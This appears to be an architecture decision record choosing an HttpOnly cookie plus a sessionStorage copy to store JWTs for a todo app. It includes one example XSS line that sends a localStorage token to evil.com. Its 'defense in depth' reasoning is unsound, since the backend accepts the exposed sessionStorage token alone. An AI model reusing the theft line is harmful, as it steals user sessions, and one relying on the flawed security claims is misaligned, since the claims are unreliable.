# ADR-002: HttpOnly Cookies for JWT Token Storage

**Status**: Accepted
**Date**: 2026-01-12
**Feature**: 003-jwt-auth (Phase II Step 2)
**Decision Makers**: Claude Code Agent

## Context

JWT tokens issued by Better Auth on the frontend must be stored securely on the client side and transmitted to the FastAPI backend on every API request. The storage mechanism must:
- Protect against Cross-Site Scripting (XSS) attacks
- Protect against Cross-Site Request Forgery (CSRF) attacks
- Enable automatic inclusion in API requests (Authorization header)
- Persist across browser tabs/windows (single session)
- Clear on logout or expiration
- Work with CORS (frontend and backend on different origins in development)

Common token storage mechanisms:
1. **HttpOnly Cookies**: Server-set cookies with `HttpOnly` flag preventing JavaScript access
2. **localStorage**: Browser API for persistent key-value storage accessible via JavaScript
3. **sessionStorage**: Browser API for tab-scoped storage accessible via JavaScript
4. **In-Memory Storage**: JavaScript variable (no persistence across page reloads)

## Decision Drivers

1. **XSS Protection**: Token must not be accessible from JavaScript if attacker injects malicious script
2. **CSRF Protection**: Token transmission must validate request origin
3. **User Experience**: Seamless authentication across tabs; no repeated logins
4. **API Integration**: Backend needs token in Authorization header (not just cookies)
5. **Logout Capability**: Must be able to clear token on client side
6. **Development Workflow**: Must work with localhost frontend (port 3000) calling backend (port 8000)

## Alternatives Considered

### Option 1: localStorage Only
**Pros**:
- Simple JavaScript API: `localStorage.setItem('token', jwt)`
- Persists across browser sessions (survives tab close)
- Easy to include in Authorization header: `Bearer ${localStorage.getItem('token')}`
- No CORS credentials complexity

**Cons**:
- **CRITICAL SECURITY FLAW**: Accessible from any JavaScript code (XSS vulnerability)
- If attacker injects `<script>` tag, can steal token: `fetch('https://evil.com?token=' + localStorage.getItem('token'))`
- No built-in expiration (must implement manual cleanup)
- Shared across all tabs (can't have multi-account sessions)

**Rejected**: XSS vulnerability unacceptable for authentication tokens; violates security best practices.

### Option 2: sessionStorage Only
**Pros**:
- Tab-scoped (separate sessions per tab possible)
- Clears automatically on tab close
- Easy Authorization header construction

**Cons**:
- **Same XSS vulnerability as localStorage** (JavaScript accessible)
- Poor user experience (lose authentication on tab close)
- No cross-tab session sharing (each tab requires separate login)

**Rejected**: XSS vulnerability + poor UX (session loss on tab close).

### Option 3: In-Memory Storage Only (JavaScript Variable)
**Pros**:
- Not persisted to disk (slightly better security than localStorage)
- Fast access (no storage API calls)

**Cons**:
- **XSS vulnerability remains** (attacker can access JavaScript variables)
- Lost on page reload (user must re-login on every refresh)
- Terrible user experience for web application

**Rejected**: XSS vulnerability + catastrophic UX.

### Option 4: HttpOnly Cookies Only (Backend-Set)
**Pros**:
- **XSS Protection**: `HttpOnly` flag makes token inaccessible from JavaScript
- **CSRF Protection**: `SameSite=Lax` attribute prevents cross-site request attacks
- **Automatic Transmission**: Browser includes cookie in API requests automatically
- Secure flag enforces HTTPS in production

**Cons**:
- Cannot access from JavaScript to construct Authorization header (cookies go in Cookie header, not Authorization header)
- CORS complexity: Requires `credentials: 'include'` in fetch calls and `allow_credentials=True` in backend
- Backend must read from Cookie header instead of standard Authorization header

**Partial Solution**: Solves XSS but creates Authorization header challenge.

### Option 5: HttpOnly Cookies + sessionStorage Cache (Chosen)
**Pros**:
- **XSS Protection**: Primary token in HttpOnly cookie (JavaScript cannot steal it)
- **Authorization Header Support**: sessionStorage copy enables `Authorization: Bearer <token>` header construction
- **Defense in Depth**: If XSS extracts sessionStorage token, attacker still needs CSRF bypass (SameSite cookie protection)
- **UX**: Seamless authentication; token persists across page reloads within session
- **Logout**: Clear both cookie and sessionStorage on logout

**Cons**:
- Dual storage increases complexity (must sync cookie and sessionStorage)
- sessionStorage token exposed to JavaScript (partial XSS risk if attacker extracts before use)
- Requires CORS credentials configuration

**Accepted**: Best balance of security and functionality; sessionStorage XSS risk mitigated by HttpOnly cookie as source of truth.

## Decision

**We will use HttpOnly cookies as the primary token storage with sessionStorage as a cache for Authorization header construction.**

### Implementation Details

#### Frontend (Better Auth Configuration)

```typescript
// src/lib/auth.ts
export const auth = new BetterAuth({
  session: {
    cookieName: "todo-session",
    cookieOptions: {
      httpOnly: true,               // Prevent JavaScript access
      secure: process.env.NODE_ENV === "production",  // HTTPS only in prod
      sameSite: "lax",              // CSRF protection
      maxAge: 3600,                 // 1 hour
      path: "/",                    // Available to all routes
    },
  },
});
```

#### Frontend (API Client)

```typescript
// src/lib/api-client.ts
export async function apiRequest(endpoint: string, options: RequestInit = {}) {
  // Get token from sessionStorage (cache)
  const token = sessionStorage.getItem('jwt_token');

  if (!token) {
    // Attempt to refresh from cookie via auth endpoint
    await fetch('/api/auth/refresh', { credentials: 'include' });
    // After refresh, token will be in sessionStorage
  }

  return fetch(`${process.env.NEXT_PUBLIC_API_URL}${endpoint}`, {
    ...options,
    credentials: 'include',  // Send cookies with request
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${sessionStorage.getItem('jwt_token')}`,
    },
  });
}
```

#### Frontend (Login Flow)

```typescript
// After successful login
const response = await auth.signIn({ email, password });
if (response.token) {
  // Store token in sessionStorage for Authorization header
  sessionStorage.setItem('jwt_token', response.token);
}
// Cookie is automatically set by Better Auth via Set-Cookie header
```

#### Backend (CORS Configuration)

```python
# backend/src/main.py
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],  # Frontend origin
    allow_credentials=True,                    # Required for cookies
    allow_methods=["*"],
    allow_headers=["*"],
)
```

#### Backend (JWT Verification)

```python
# backend/src/auth/jwt_handler.py
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthCredentials
import jwt

security = HTTPBearer()

async def verify_jwt(credentials: HTTPAuthCredentials = Depends(security)) -> dict:
    """Extract JWT from Authorization header and verify."""
    token = credentials.credentials
    try:
        payload = jwt.decode(
            token,
            settings.BETTER_AUTH_SECRET,
            algorithms=["HS256"],
            audience="todo-api",
            issuer="todo-app",
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

## Consequences

### Positive

1. **Strong XSS Protection**: HttpOnly cookie cannot be stolen by injected JavaScript (primary defense)
2. **CSRF Protection**: SameSite=Lax prevents cross-origin attacks (tokens only sent to same-site requests)
3. **HTTPS Enforcement**: Secure flag ensures production tokens never transmitted over HTTP
4. **Standard Authorization Header**: sessionStorage enables `Authorization: Bearer` pattern (backend doesn't need cookie parsing)
5. **Automatic Cookie Management**: Browser handles cookie sending/receiving (less frontend code)
6. **Logout Capability**: Can clear both cookie (via API call) and sessionStorage (JavaScript)

### Negative

1. **Dual Storage Complexity**: Must synchronize cookie and sessionStorage (risk of desync if not implemented carefully)
2. **Partial XSS Risk**: sessionStorage token exposed to JavaScript (mitigated by cookie as source of truth)
3. **CORS Credentials Required**: Frontend must use `credentials: 'include'` on all API calls (extra configuration)
4. **Cookie Size Limit**: JWT must fit in 4KB cookie limit (acceptable; our tokens <1KB)
5. **Mobile WebView Concerns**: Some mobile browsers handle HttpOnly cookies inconsistently (acceptable risk for Phase II; native apps not in scope)

### Neutral

1. **Token Refresh**: Can refresh by calling `/api/auth/refresh` with credentials (cookie sent automatically, new token returned)
2. **Multi-Tab Sessions**: sessionStorage is tab-scoped, but cookie is shared (requires re-fetching token in new tabs)
3. **Development Workflow**: Requires backend CORS configured to accept localhost frontend (standard setup)

## Security Analysis

### Threat Model

| Attack Vector | Storage Mechanism | Mitigation |
|---|---|---|
| **XSS (Injected Script)** | sessionStorage | ⚠️ Exposed; attacker can read `sessionStorage.getItem('jwt_token')` |
| **XSS (Injected Script)** | HttpOnly Cookie | ✅ Protected; JavaScript cannot access cookie |
| **CSRF (Cross-Site Request)** | sessionStorage | ✅ Protected; Authorization header not sent cross-origin by browser |
| **CSRF (Cross-Site Request)** | HttpOnly Cookie | ✅ Protected; SameSite=Lax prevents cookie from being sent cross-origin |
| **Man-in-the-Middle (HTTP)** | Both | ✅ Protected; Secure flag prevents transmission over HTTP in production |
| **Session Hijacking** | Both | ⚠️ Partial; 1-hour expiration limits window; no revocation before expiry |

### Defense in Depth Rationale

Even if attacker extracts sessionStorage token via XSS:
1. **Cookie Validation**: Backend can optionally verify cookie matches Authorization header token (double-submit cookie pattern)
2. **Short Expiration**: 1-hour lifetime limits damage window
3. **User Isolation**: Token only grants access to authenticated user's own tasks (no privilege escalation)

### Why Not Cookie-Only?

Backend would need to read token from `Cookie` header instead of `Authorization` header. This is non-standard for JWT APIs and would require:
- Custom middleware to extract cookie and populate Authorization context
- All API clients must send cookies (complicates API testing, documentation)
- Violates REST API best practice (stateless; Authorization header is standard)

By caching in sessionStorage, we maintain standard `Authorization: Bearer` pattern while preserving HttpOnly cookie security.

## Compliance

- ✅ **Constitution Principle VI**: Technology Stack - Uses standard web APIs (cookies, sessionStorage)
- ✅ **Specification FR-005**: "JWT tokens MUST be stored securely on frontend (HttpOnly cookies preferred)"
- ✅ **Specification FR-006**: "API requests MUST include token in Authorization header" - Enabled via sessionStorage cache
- ✅ **Specification SC-08**: "Average JWT validation time <5ms" - No validation overhead from storage choice

## References

- **Feature Specification**: [specs/003-jwt-auth/spec.md](../../specs/003-jwt-auth/spec.md)
- **Implementation Plan**: [specs/003-jwt-auth/plan.md](../../specs/003-jwt-auth/plan.md)
- **Research**: [specs/003-jwt-auth/research.md](../../specs/003-jwt-auth/research.md) (Decision 8: Token Storage)
- **OWASP JWT Storage Best Practices**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html (external)
- **SameSite Cookie Attribute**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite (external)

## Review

- **Approved By**: User (via specification preference for HttpOnly cookies)
- **Review Date**: 2026-01-12
- **Next Review**: After Phase II Step 2 implementation (validate security posture and UX)
